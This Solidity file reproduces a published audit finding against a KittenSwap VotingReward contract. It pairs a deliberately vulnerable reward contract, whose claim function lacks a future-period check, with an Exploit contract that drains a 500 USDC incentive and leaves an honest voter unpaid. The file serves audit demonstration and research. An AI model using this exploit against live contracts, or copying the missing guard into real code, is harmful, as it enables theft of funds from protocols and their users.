// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 58207 (C-03):
// "Incentive rewards may be stolen".
//
// Real audited source (the three reward functions are reproduced VERBATIM from
// the finding's embedded snippet; the vulnerable line is marked @>):
//   protocol KittenSwap  (Pashov Audit Group, 2025-06-12)
//   contract VotingReward
//   fns      incentivize / _deposit / getRewardForPeriod
//   report   github.com/pashov/audits/blob/master/team/md/
//              KittenSwap-security-review_2025-06-12.md
//
// Root cause: `getRewardForPeriod` never validates that `_period` is not a
// FUTURE period (it lacks a `_period <= getCurrentPeriod()` guard). Both
// `incentivize` and `_deposit` record into `getCurrentPeriod() + 1` (the next,
// still-open period). Because voting power for that period is still being
// accumulated, whoever votes first and claims first is momentarily the ONLY
// voter, so `earned = rewards * myVotes / totalVotes = 100%` and they drain the
// entire incentive. Honest voters who vote into the same period afterwards are
// owed a pro-rata share the contract can no longer pay.
//
// The three reward functions are byte-for-byte the finding's snippet. The
// supporting reward accounting (`_addReward`, `_getReward`, `earned`,
// `getCurrentPeriod`), the `Voter`/`VeKitten` gates, the `nonReentrant` guard
// and the ERC20 are faithful minimal doubles with real transfers and real
// pro-rata accounting — the theft emerges from the verbatim code, it is not
// asserted by a fake constant.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful OpenZeppelin-style reentrancy guard (KittenSwap's VotingReward
///      inherits ReentrancyGuard; the `nonReentrant` modifier is real).
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

/// @dev Faithful minimal ERC20 double for the incentive token (USDC, 6 decimals).
contract MiniToken {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of the KittenSwap Voter: holds the reward-token
///      whitelist and is the only address allowed to record votes.
contract Voter {
    mapping(address => bool) public isWhitelisted;

    function setWhitelisted(address _token, bool _v) external {
        isWhitelisted[_token] = _v;
    }

    /// @notice A voter casts a vote for a pool; the Voter forwards the voting
    ///         power to the pool's VotingReward via `_deposit` (onlyVoter).
    function castVote(VotingReward _vr, uint256 _amount, uint256 _tokenId) external {
        _vr._deposit(_amount, _tokenId);
    }
}

/// @dev Faithful double of veKitten's ownership/approval check.
contract VeKitten {
    mapping(uint256 => address) public ownerOf;

    function setOwner(uint256 _tokenId, address _owner) external {
        ownerOf[_tokenId] = _owner;
    }

    function isApprovedOrOwner(address _spender, uint256 _tokenId) external view returns (bool) {
        return ownerOf[_tokenId] == _spender;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `incentivize`, `_deposit` and `getRewardForPeriod` are
// reproduced VERBATIM from the finding's embedded KittenSwap VotingReward snippet.
// ─────────────────────────────────────────────────────────────────────────────
contract VotingReward is ReentrancyGuard {
    error NotWhitelistedRewardToken();
    error NotApprovedOrOwner();

    Voter public voter;
    VeKitten public veKitten;

    uint256 public constant WEEK = 7 days;

    // period => tokenId => votes ; period => total votes
    mapping(uint256 => mapping(uint256 => uint256)) public tokenIdVotesInPeriod;
    mapping(uint256 => uint256) public totalVotesInPeriod;
    // token => period => rewards deposited for that period
    mapping(address => mapping(uint256 => uint256)) public tokenRewardsPerPeriod;
    // period => tokenId => token => already claimed?
    mapping(uint256 => mapping(uint256 => mapping(address => bool))) public isRewardClaimed;

    constructor(Voter _voter, VeKitten _veKitten) {
        voter = _voter;
        veKitten = _veKitten;
    }

    modifier onlyVoter() {
        require(msg.sender == address(voter), "only voter");
        _;
    }

    // ── faithful reward accounting doubles (period-indexed, pro-rata) ──

    function getCurrentPeriod() public view returns (uint256) {
        return block.timestamp / WEEK;
    }

    function _addReward(uint256 _period, address _token, uint256 _amount) internal returns (uint256) {
        MiniToken(_token).transferFrom(msg.sender, address(this), _amount);
        tokenRewardsPerPeriod[_token][_period] += _amount;
        return _amount;
    }

    /// @notice pro-rata share of the period's rewards for this tokenId.
    function earned(uint256 _period, uint256 _tokenId, address _token) public view returns (uint256) {
        if (isRewardClaimed[_period][_tokenId][_token]) return 0;
        uint256 total = totalVotesInPeriod[_period];
        if (total == 0) return 0;
        return (tokenRewardsPerPeriod[_token][_period] * tokenIdVotesInPeriod[_period][_tokenId]) / total;
    }

    function _getReward(uint256 _period, uint256 _tokenId, address _token, address _receiver) internal {
        uint256 reward = earned(_period, _tokenId, _token);
        isRewardClaimed[_period][_tokenId][_token] = true;
        if (reward > 0) {
            MiniToken(_token).transfer(_receiver, reward);
        }
    }

    // ── VERBATIM from the finding's embedded snippet ──

    function incentivize(
        address _token,
        uint256 _amount
    ) external virtual nonReentrant {
        // Here we have one white list for token. So we cannot manipulate the token.
        if (voter.isWhitelisted(_token) == false)
            revert NotWhitelistedRewardToken();
        uint256 currentPeriod = getCurrentPeriod() + 1;
        uint256 amount = _addReward(currentPeriod, _token, _amount);
    }
    function _deposit(uint256 _amount, uint256 _tokenId) external onlyVoter {
        uint256 nextPeriod = getCurrentPeriod() + 1;

        tokenIdVotesInPeriod[nextPeriod][_tokenId] += _amount;
        totalVotesInPeriod[nextPeriod] += _amount;
    }
    function getRewardForPeriod(
        uint256 _period,
        uint256 _tokenId,
        address _token
    ) external nonReentrant {
        // Only owner or approved can get rewards.
        if (!veKitten.isApprovedOrOwner(msg.sender, _tokenId))
            revert NotApprovedOrOwner();
        _getReward(_period, _tokenId, _token, msg.sender); // @> VULN: no `_period <= getCurrentPeriod()` check — rewards of a still-open FUTURE period are claimable
    }
}

/// @dev Faithful double of a protocol/DAO seeding voter incentives for a pool.
contract Incentivizer {
    function seed(VotingReward _vr, MiniToken _token, uint256 _amount) external {
        _token.approve(address(_vr), type(uint256).max);
        _vr.incentivize(address(_token), _amount);
    }
}

/// @dev Honest co-voter's claim actor (so the claim runs as her, satisfying the
///      veKitten owner check). Used to prove she cannot be paid after the drain.
contract HonestVictim {
    function claim(VotingReward _vr, uint256 _period, uint256 _tokenId, address _token) external {
        _vr.getRewardForPeriod(_period, _tokenId, _token);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the attacker (this contract) votes into the still-open future
// period, then claims it while the sole voter — draining 100% of a 500 USDC
// incentive it never funded. An honest co-voter who votes the same amount into
// the same period is then owed 250 USDC the drained pool cannot pay.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public usdc;
    Voter public voter;
    VeKitten public veKitten;
    VotingReward public vuln;
    Incentivizer public alice;
    HonestVictim public carol;

    uint256 public constant INCENTIVE = 500e6; // 500 USDC seeded for period X voters
    uint256 public constant VOTES = 100; // equal voting power for attacker & honest voter

    uint256 public futurePeriod; // the still-open period X = currentPeriod + 1
    uint256 public periodAtClaim; // getCurrentPeriod() when the attacker claims (< X)
    uint256 public attackerFunded; // USDC the attacker put in (0)
    uint256 public attackerProfit; // USDC drained by the attacker
    uint256 public carolOwed; // honest co-voter's fair pro-rata share
    uint256 public carolReceived; // what she actually gets (0 — pool drained)
    uint256 public poolAfter; // reward pool balance after the drain

    uint256 internal constant ATTACKER_ID = 1;
    uint256 internal constant CAROL_ID = 2;

    constructor() {
        usdc = new MiniToken(); // child nonce 1 (profit token)
        voter = new Voter(); // child nonce 2
        veKitten = new VeKitten(); // child nonce 3
        vuln = new VotingReward(voter, veKitten); // child nonce 4 (VULN)
        alice = new Incentivizer(); // child nonce 5
        carol = new HonestVictim(); // child nonce 6

        // whitelist USDC as a reward token
        voter.setWhitelisted(address(usdc), true);
        // veNFT #1 belongs to the attacker (this contract), #2 to the honest voter
        veKitten.setOwner(ATTACKER_ID, address(this));
        veKitten.setOwner(CAROL_ID, address(carol));
    }

    function run() external {
        futurePeriod = vuln.getCurrentPeriod() + 1; // period X (still open)

        // 1) A protocol/DAO (Alice) seeds 500 USDC to reward period-X voters.
        usdc.mint(address(alice), INCENTIVE);
        alice.seed(vuln, usdc, INCENTIVE);

        // 2) Attacker votes into the still-open future period X (via the Voter).
        //    Attacker funds ZERO incentives.
        attackerFunded = 0;
        voter.castVote(vuln, VOTES, ATTACKER_ID);

        // 3) Attacker claims period X immediately. `getRewardForPeriod` has no
        //    future-period guard, so the claim succeeds even though X is NOT yet
        //    a past period. As the sole voter so far, earned = 100% of 500 USDC.
        periodAtClaim = vuln.getCurrentPeriod(); // strictly less than futurePeriod
        uint256 balBefore = usdc.balanceOf(address(this));
        vuln.getRewardForPeriod(futurePeriod, ATTACKER_ID, address(usdc));
        attackerProfit = usdc.balanceOf(address(this)) - balBefore;

        // 4) An honest voter (Carol) now votes the SAME amount into period X.
        voter.castVote(vuln, VOTES, CAROL_ID);
        carolOwed = vuln.earned(futurePeriod, CAROL_ID, address(usdc)); // fair 250 USDC

        // 5) Carol tries to claim her fair share, but the pool is drained.
        try carol.claim(vuln, futurePeriod, CAROL_ID, address(usdc)) {
            carolReceived = usdc.balanceOf(address(carol));
        } catch {
            carolReceived = 0; // transfer reverts: pool holds 0 USDC
        }

        poolAfter = usdc.balanceOf(address(vuln));

        // HARM: attacker drained the FULL incentive of a still-open future period
        // it never funded, and an honest co-voter is owed a share the pool
        // cannot pay.
        require(periodAtClaim < futurePeriod, "claim was not of a future period");
        require(attackerFunded == 0, "attacker should risk nothing");
        require(attackerProfit == INCENTIVE, "attacker did not steal full incentive");
        require(carolOwed == INCENTIVE / 2, "honest voter not owed her fair share");
        require(carolReceived == 0, "honest voter unexpectedly paid");
        require(poolAfter == 0, "reward pool not fully drained");
    }
}
